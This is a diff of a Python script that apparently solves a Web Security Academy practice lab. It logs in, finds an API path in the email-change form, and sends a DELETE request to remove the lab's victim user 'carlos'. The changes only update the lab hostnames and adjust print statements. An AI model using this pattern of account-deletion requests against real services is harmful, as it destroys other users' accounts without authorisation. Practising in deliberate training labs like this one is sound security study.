@@ -5,12 +5,12 @@ import requests
 from bs4 import BeautifulSoup as BS
 
 if __name__ == "__main__":
-    base_url = "https://0aef00350399625082561a42001a0011.web-security-academy.net/"
+    base_url = "https://0a1300b10338a7c1814526c1001000c9.web-security-academy.net/"
     login_url = base_url + "login"
     my_account_url = base_url + "my-account"
 
     headers = {
-        "Host": "0aef00350399625082561a42001a0011.web-security-academy.net",
+        "Host": "0a1300b10338a7c1814526c1001000c9.web-security-academy.net",
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Referer": base_url,
         "Connection": "keep-alive",
@@ -57,7 +57,7 @@ if __name__ == "__main__":
     res = requests.post(login_url, headers=headers, data=login_payload, cookies=cookies, allow_redirects=False)
     if res.status_code == 302:
         cookies = dict(res.cookies)
-        #print("second cookie: ", cookies)
+        
         print("Logged In, Redirect Location:", res.headers.get("Location"))
         redirect_location = res.headers.get("Location")
         print(redirect_location)
@@ -73,7 +73,9 @@ if __name__ == "__main__":
             form_action = soup.find("form", {"name": "email-change-form"})
             if form_action:
                 api_path = form_action["action"]
-                print("API_Path found",api_path)
+                print("***********************************")
+                print("API_Path found is:  ",api_path)
+                print("***********************************")
                 
                 api_url = base_url.strip("/") + api_path
                 print(f"API URL: {api_url}")
@@ -102,7 +104,7 @@ if __name__ == "__main__":
                 print("API URL Not Found.")
                 exit()
         victim = "carlos"
-        api_url=f"https://0aef00350399625082561a42001a0011.web-security-academy.net/api/user/{victim}"
+        api_url=f"https://0a1300b10338a7c1814526c1001000c9.web-security-academy.net/api/user/{victim}"
         res=requests.delete(api_url,headers=headers,json=payload,cookies=cookies)
         if res.status_code==200:
             print(res.text)
